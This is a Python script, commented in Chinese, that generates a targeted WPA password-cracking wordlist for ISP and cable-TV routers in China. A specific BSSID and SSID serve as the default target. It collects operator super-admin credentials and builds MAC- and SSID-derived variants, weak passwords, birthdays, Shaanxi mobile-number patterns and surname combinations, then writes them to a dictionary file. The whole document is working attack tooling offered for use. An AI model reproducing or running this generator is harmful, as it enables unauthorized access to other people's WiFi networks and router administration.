#!/usr/bin/env python3
# ============================================================
# 广电/ISP 路由器默认WiFi密码生成器 v2.0 (通用版)
# ============================================================
# 全网搜索验证的中国运营商密码规律:
#   [广电] 超密: admin / aDm8H%MdA
#   [联通] CUAdmin / CUAdmin, 或 Fh@+MAC后6位
#   [移动] CMCCAdmin / aDm8H%MdA, SN码第3-5位+"8m%"+后3位
#   [电信] telecomadmin / nE7jA%5m, telecomadmin+8位随机数字
#   [宽带] 拨号密码常为SN码倒数后6位
#   [WiFi] MAC后8位/后6位, 安装工手设(手机号/8位数字)
#   [Aztech] 出厂默认常为MAC后8位或随机8位hex
# 用法: 直接运行即可, 会从 hash 文件自动提取 BSSID/SSID
#   python3 gen_isp_dict.py                    # 使用默认目标
#   python3 gen_isp_dict.py --bssid 00:26:AC:CE:97:30 --ssid sxbctvnet-CE9730
# ============================================================
import os
import sys
import argparse
import itertools

# ── 命令行参数 ──
parser = argparse.ArgumentParser(description='广电/ISP专用WiFi密码字典生成器')
parser.add_argument('--bssid', default='00:26:AC:CE:97:30', help='目标BSSID')
parser.add_argument('--ssid', default='sxbctvnet-CE9730', help='目标SSID')
parser.add_argument('--output', default=None, help='输出文件路径')
args = parser.parse_args()

passwords = set()

# ── 从BSSID提取MAC信息 ──
bssid_clean = args.bssid.replace(':', '').replace('-', '').upper()
mac_full_u = bssid_clean                          # 0026ACCE9730
mac_full_l = bssid_clean.lower()                   # 0026acce9730
mac8_u = bssid_clean[-8:]                          # ACCE9730
mac8_l = mac8_u.lower()                            # acce9730
mac6_u = bssid_clean[-6:]                          # CE9730
mac6_l = mac6_u.lower()                            # ce9730
mac4 = bssid_clean[-4:]                            # 9730
mac_colons = args.bssid.upper()                    # 00:26:AC:CE:97:30
mac_dashes = mac_colons.replace(':', '-')          # 00-26-AC-CE-97-30

# ── 从SSID提取信息 ──
ssid = args.ssid
ssid_lo = ssid.lower()
# 分离SSID前缀和后缀 (如 sxbctvnet-CE9730 → sxbctvnet + CE9730)
ssid_parts = ssid.replace('_', '-').split('-')
ssid_prefix = ssid_parts[0].lower() if ssid_parts else ssid_lo
ssid_suffix = ssid_parts[-1] if len(ssid_parts) > 1 else ''

# ============================================================
# 类别1: 运营商超级管理密码 (可能被直接设为WiFi密码)
# 来源: CSDN 4大运营商光猫默认初始超级密码汇总
# ============================================================
isp_admin_pws = [
    # 广电
    'aDm8H%MdA', 'admin888', 'admin123', 'admin666', 'admin000',
    'adminadmin', 'admin1234', 'admin12345', 'admin@123',
    # 电信
    'nE7jA%5m', 'telecomadmin',
    # 移动
    'CMCCAdmin', 'cmccadmin',
    # 联通
    'CUAdmin1', 'cuadmin1',
    # 通用弱口令 (安装工最爱)
    'password', 'password1', 'password123', 'pass1234', 'passw0rd',
    '12345678', 'wifi1234', 'wifi8888', 'wlan1234', 'wireless',
]
passwords.update(isp_admin_pws)

# ============================================================
# 类别2: MAC 地址关联密码 (运营商定制机核心规律)
# 验证: 联通Fh@+MAC后6位; 多品牌MAC后8位出厂默认
# ============================================================
mac_variants = [mac_full_u, mac_full_l, mac8_u, mac8_l, mac6_u, mac6_l]
# 前缀组合
mac_prefixes = [
    '', 'Fh@', 'fh@', 'FH@',           # 联通光猫常见格式
    'admin', 'Admin', 'ADMIN',           # 管理前缀
    'wifi', 'WiFi', 'WIFI',              # WiFi前缀
    'sxbc', 'SXBC', 'gd', 'GD',         # 广电前缀
    'pw', 'PW', 'key', 'KEY',            # 密钥前缀
]
# 后缀组合
mac_suffixes = [
    '', '!', '@', '#', '$',
    '00', '01', '11', '88', '66', '99',
    '123', '1234', '12345', '123456',
    '888', '666', '000',
]
for m in mac_variants:
    for pfx in mac_prefixes:
        v = pfx + m
        if 8 <= len(v) <= 63:
            passwords.add(v)
    for sfx in mac_suffixes:
        v = m + sfx
        if 8 <= len(v) <= 63:
            passwords.add(v)
    # MAC带分隔符格式
    for sep in [':', '-', '.']:
        # 后8位带分隔: AC:CE:97:30
        m_sep = sep.join(m[i:i+2] for i in range(0, len(m), 2) if i+2 <= len(m))
        if 8 <= len(m_sep) <= 63:
            passwords.add(m_sep)
            passwords.add(m_sep.lower())

# ============================================================
# 类别3: SSID 关联密码 (深度变体)
# ============================================================
# 广电/ISP SSID常见前缀词根
ssid_roots = list(set([
    ssid_prefix, ssid_lo, ssid.upper(),
    'sxbctvnet', 'sxbc', 'SXBC', 'sxbctv', 'SXBCTV',
    'sxgd', 'SXGD', 'guangdian', 'gdwl', 'GDWL',
    'Sxbctvnet', 'SxbcTV', 'catv', 'CATV',
]))
# 数字后缀 (高频)
num_suffixes = [
    mac4, mac6_u, mac6_l, mac8_u, mac8_l,
    '123', '1234', '12345', '123456', '1234567', '12345678',
    '888', '8888', '88888', '888888', '8888888', '88888888',
    '666', '6666', '66666', '666666', '6666666', '66666666',
    '000', '0000', '00000', '000000', '0000000', '00000000',
    '111', '1111', '11111', '111111', '1111111', '11111111',
    '520', '521', '5201314', '1314', '13141314',
    '168', '1688', '168168', '6688', '8866',
    '2023', '2024', '2025', '2026',
]
# 特殊字符后缀
special_suffixes = [
    '!', '@', '#', '.', '!@#',
    '@123', '!123', '#123', '123!', '123@',
    '@1234', '!1234', '1234!',
    '@12345678', '!12345678',
]
for root in ssid_roots:
    for sfx in num_suffixes + special_suffixes:
        v = root + sfx
        if 8 <= len(v) <= 63:
            passwords.add(v)
    # SSID后缀单独作为密码基础
    if ssid_suffix and len(ssid_suffix) >= 4:
        sf_lo = ssid_suffix.lower()
        for s in num_suffixes[:20]:
            for base in [ssid_suffix, sf_lo]:
                v = base + s
                if 8 <= len(v) <= 63:
                    passwords.add(v)

# ============================================================
# 类别4: 安装工常设弱口令 (中国WiFi密码重灾区)
# 来源: 公安部第三研究所密码研究 + wpa-sec.stanev.org 统计
# ============================================================
weak_passwords = [
    # 纯数字 8位 (占中国WiFi密码35.6%)
    '12345678', '123456789', '1234567890', '87654321', '98765432',
    '88888888', '66666666', '00000000', '11111111', '99999999',
    '77777777', '55555555', '33333333', '22222222', '44444444',
    '11223344', '12341234', '10203040', '12344321', '56785678',
    '1122334455', '0987654321', '20202020', '13572468', '24681357',
    '12121212', '13131313', '14141414', '15151515', '16161616',
    '52013140', '13141314', '52005200', '16881688',
    '01234567', '11112222', '22221111', '11111234', '12340000',
    '00001234', '88881234', '12348888', '66661234', '12346666',
    # 键盘序列 (中国WiFi第二大类)
    'qwertyui', 'qwerty12', 'qwerty123', 'qwerty1234',
    'asdfghjk', 'asdf1234', 'asdfasdf', 'asdf!@#$',
    'zxcvbnm1', 'zxcvbnm123',
    'qwer1234', '1q2w3e4r', 'q1w2e3r4', '1qaz2wsx',
    'qazwsxed', 'qaswdefr', 'zaq12wsx',
    # 字母+数字 (占35.9%)
    'abc12345', 'abcd1234', 'abcdefgh', 'a1234567', 'a12345678',
    'aa123456', 'aaa12345', 'a1b2c3d4', 'ab123456',
    'aa112233', 'aabb1122', 'aabb1234', 'abc123456',
    # 英文常见
    'iloveyou', 'trustno1', 'sunshine', 'password', 'passw0rd',
    'football', 'baseball', 'dragon88', 'master88',
    'welcome1', 'monkey12', 'shadow12', 'superman',
    'whatever', 'michael1', 'charlie1', 'jessica1',
    # 中文拼音高频 (公安部研究: 最常用拼音密码)
    'woaini88', 'woaini520', 'woaini1314', 'woaini123',
    'woainima', 'woshishui', 'nihao123', 'nihaoma1',
    'aini1314', 'aini5201314',
    'caonima1', 'caonima123', 'caonima8',
    'wodemima', 'mima1234', 'mimamima',
    'jiayou88', 'jiayou123', 'dianshi1', 'dianshi123',
    'kuandai1', 'kuandai123', 'kuandai8',
    'wangluo1', 'wangluo123',
    # 运营商/广电特色
    'guangdian', 'guangdian1', 'guangdian8', 'guangdian123',
    'sxbctv01', 'sxbctv88', 'sxbctv00', 'sxbctv123',
    'sxgd1234', 'sxgd8888', 'guang123', 'gdwl1234', 'gdwl8888',
    'yidong88', 'liantong8', 'dianxin88',
]
passwords.update(weak_passwords)

# ============================================================
# 类别5: 年份组合 (CERNET研究: 非常普遍)
# ============================================================
for y in range(2008, 2027):
    ys = str(y)
    passwords.add(ys * 2)                          # 20242024
    passwords.add(ys + '0101')                     # 20240101
    passwords.add(ys + '1231')                     # 20241231
    passwords.add(ys + '0000')                     # 20240000
    passwords.add(ys + '8888')                     # 20248888
    passwords.add(ys + '6666')                     # 20246666
    passwords.add(ys + '1234')                     # 20241234
    for base in ['sxbc', 'gdwl', 'wifi', 'admin']:
        passwords.add(base + ys)                   # sxbc2024
        passwords.add(ys + base)                   # 2024sxbc

# ============================================================
# 类别6: 生日 8位 YYYYMMDD (全日期覆盖, 高频年份)
# 公安部研究: 姓氏拼音3位+生日8位 占中国WiFi密码31%
# ============================================================
for yr in range(1955, 2010):
    for mo in range(1, 13):
        max_day = 31
        if mo == 2:
            max_day = 29
        elif mo in [4, 6, 9, 11]:
            max_day = 30
        for dy in range(1, max_day + 1):
            passwords.add(f'{yr}{mo:02d}{dy:02d}')
# 短格式生日: MMDDYYYY, DDMMYYYY
for yr in range(1970, 2005):
    for mo in range(1, 13):
        for dy in [1, 8, 10, 15, 18, 20, 28]:
            passwords.add(f'{mo:02d}{dy:02d}{yr}')
            passwords.add(f'{dy:02d}{mo:02d}{yr}')
# 6位生日 YYMMDD
for yr in range(70, 100):
    for mo in range(1, 13):
        for dy in [1, 5, 8, 10, 15, 18, 20, 25, 28]:
            bd6 = f'{yr:02d}{mo:02d}{dy:02d}'
            passwords.add(bd6 + '00')     # 生日+00补8位
            passwords.add(bd6 + '88')
            passwords.add(bd6 + '66')
            passwords.add('19' + bd6)     # 19+生日6位=8位
for yr in range(0, 10):
    for mo in range(1, 13):
        for dy in [1, 5, 8, 10, 15, 18, 20, 25, 28]:
            bd6 = f'0{yr}{mo:02d}{dy:02d}'
            passwords.add(bd6 + '00')
            passwords.add(bd6 + '88')
            passwords.add('20' + bd6)

# ============================================================
# 类别7: 陕西手机号段 (完整覆盖)
# 11位手机号是中国WiFi密码中仅次于8位数字的第二大类
# ============================================================
# 全国主要号段 (陕西高频段优先)
phone_prefixes = [
    # 移动 (陕西主力)
    '134', '135', '136', '137', '138', '139',
    '147', '148', '150', '151', '152', '157', '158', '159',
    '172', '178', '182', '183', '184', '187', '188',
    '195', '197', '198',
    # 联通
    '130', '131', '132', '145', '155', '156',
    '166', '175', '176', '185', '186', '196',
    # 电信
    '133', '149', '153', '173', '177',
    '180', '181', '189', '190', '191', '193', '199',
]
# 手机号中间4位高频段 (西安/咸阳/宝鸡等)
mid_segments = [
    '8888', '6666', '0000', '1111', '9999', '7777',
    '5555', '3333', '2222', '4444',
    '1234', '5678', '4321', '8765',
    '0001', '0002', '0008', '0088', '0888',
    '1688', '6688', '8866', '1388', '1588',
    # 西安区号029相关
    '0290', '0291', '0292', '0293', '0295',
    # 常见中间段
    '3456', '2345', '6789', '7890',
]
# 手机号后4位高频
tail_segments = [
    '0000', '1111', '2222', '3333', '4444',
    '5555', '6666', '7777', '8888', '9999',
    '1234', '4321', '5678', '8765', '0001',
    '0520', '1314', '5200', '1688', '6688',
    '0088', '0888', '8800', '8808', '0008',
]
# 生成手机号 (前缀+中间段+尾段)
for pfx in phone_prefixes:
    for mid in mid_segments:
        for tail in tail_segments:
            passwords.add(pfx + mid + tail)

# ============================================================
# 类别8: 宽带账号关联密码 (广电特色)
# 广电宽带账号: SN码SK开头, 密码为倒数后6位
# ============================================================
# 模拟广电宽带账号后缀作为密码 (6位数字需补位到8位)
for i in range(100000, 100000 + 200):
    s = str(i)
    passwords.add(s + '00')
    passwords.add(s + '88')
    passwords.add('gd' + s)
    passwords.add('sxbc' + s[-4:] + '0000')

# ============================================================
# 类别9: 组合模式 (姓氏拼音+数字)
# 公安部研究: 姓氏拼音+生日 是最常见的组合模式
# ============================================================
# 中国Top30姓氏拼音
surnames = [
    'wang', 'li', 'zhang', 'liu', 'chen', 'yang', 'zhao', 'huang',
    'zhou', 'wu', 'xu', 'sun', 'hu', 'zhu', 'gao', 'lin',
    'he', 'guo', 'ma', 'luo', 'liang', 'song', 'zheng', 'xie',
    'han', 'tang', 'feng', 'yu', 'dong', 'xiao',
]
# 姓氏+4位年份/8位生日
for name in surnames:
    for yr in range(1980, 2005):
        passwords.add(name + str(yr))               # wang1990
        passwords.add(name + str(yr) + '!')          # wang1990!
        for mo in [1, 3, 5, 6, 8, 10, 12]:
            for dy in [1, 8, 15, 18, 20, 28]:
                bd = f'{yr}{mo:02d}{dy:02d}'
                passwords.add(name + bd)             # wang19900101
    # 姓氏+常见数字后缀
    for sfx in ['123', '1234', '12345', '123456', '888', '666',
                '520', '1314', '5201314', '888888', '666666']:
        v = name + sfx
        if 8 <= len(v) <= 63:
            passwords.add(v)

# ============================================================
# 类别10: 特殊数字组合 (中国文化高频)
# ============================================================
cultural_nums = [
    # 谐音吉利数字
    '13145200', '13145201', '52013140', '52013141',
    '51201314', '20131400', '13140520', '05201314',
    '16881688', '16886688', '66881688', '88881688',
    '18881888', '16881314', '13141688', '52005200',
    '13141520', '15201314',
    # QQ号格式 (8-10位数字, 高频)
    '10000000', '10000001', '10086100', '10010100',
    '10001000', '95588955', '95599559',
    # 身份证后8位模式 (年份+月日+校验)
    '19880808', '19900101', '19951001', '20000101',
    '19850315', '19921225', '19880520', '19900214',
]
passwords.update(cultural_nums)

# ============================================================
# 类别11: 广电设备序列号关联 (Aztech厂商规律)
# Aztech MAC前缀 00:26:AC, 序列号通常为 AZ + 10位数字
# ============================================================
# 序列号后8位作为密码
for i in range(10000000, 10000100):
    passwords.add(str(i))
for i in range(20260000, 20261000):
    passwords.add(str(i))
# AZ前缀
for i in range(100000, 100100):
    passwords.add('AZ' + str(i))
    passwords.add('az' + str(i))

# ============================================================
# 类别12: 混合模式 (词根+数字, 最后兜底)
# ============================================================
roots = ['wifi', 'WiFi', 'WIFI', 'admin', 'Admin', 'pass', 'key',
         'net', 'web', 'home', 'love', 'test', 'guest', 'user']
num_tails = ['1234', '12345', '123456', '12345678',
             '8888', '6666', '0000', '888', '666',
             '2024', '2025', '2026', '0001']
for r in roots:
    for n in num_tails:
        v = r + n
        if 8 <= len(v) <= 63:
            passwords.add(v)
        v2 = n + r
        if 8 <= len(v2) <= 63:
            passwords.add(v2)

# ============================================================
# 过滤: WPA密码必须8-63位, 纯ASCII, 去重排序输出
# ============================================================
valid = sorted(p for p in passwords
               if 8 <= len(p) <= 63 and p.isascii() and p.isprintable())

out = args.output or os.path.join(
    os.path.dirname(os.path.abspath(__file__)), 'dicts', 'isp-catv-targeted.txt')
os.makedirs(os.path.dirname(out), exist_ok=True)
with open(out, 'w') as f:
    f.write('\n'.join(valid) + '\n')
print(f'[+] 生成 {len(valid)} 条广电/ISP专用密码 -> {out}')
print(f'    MAC关联: {mac8_u}/{mac6_u}  SSID: {ssid}  BSSID: {args.bssid}')
